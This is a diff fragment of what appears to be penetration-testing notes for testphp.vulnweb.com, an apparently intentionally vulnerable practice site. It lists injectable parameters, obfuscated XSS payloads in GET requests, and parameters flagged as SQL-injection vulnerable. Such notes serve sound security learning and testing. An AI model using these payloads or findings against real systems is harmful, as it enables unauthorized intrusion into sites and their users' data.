@@ -31,7 +31,6 @@ Collect all vulns and infomations in http://testphp.vulnweb.com/
     POST http://testphp.vulnweb.com/search.php 'searchFor'
     POST http://testphp.vulnweb.com/guestbook.php 'name'
     POST http://testphp.vulnweb.com/secured/newuser.php 'uuname'
-    
     GET http://testphp.vulnweb.com/listproducts.php?cat=<IMG sRC=X onerror=jaVaScRipT:alert`xss`>
     GET http://testphp.vulnweb.com/listproducts.php?artist=<IMG sRC=X onerror=jaVaScRipT:alert`xss`>
     GET http://testphp.vulnweb.com/hpp/?pp=%22%3E%3CIMG%20sRC=X%20onerror=jaVaScRipT:alert`xss`%3E
@@ -45,7 +44,6 @@ Collect all vulns and infomations in http://testphp.vulnweb.com/
     GET http://testphp.vulnweb.com/listproducts.php 'cat' error SQLi vulnerable
     GET http://testphp.vulnweb.com/listproducts.php 'artist' error SQLi vulnerable
     GET http://testphp.vulnweb.com/product.php 'pic' error SQLi vulnerable
-    
     GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php 'id' SQLi vulnerable
     GET http://testphp.vulnweb.com/AJAX/infocateg.php 'id' SQLi vulnerable
     
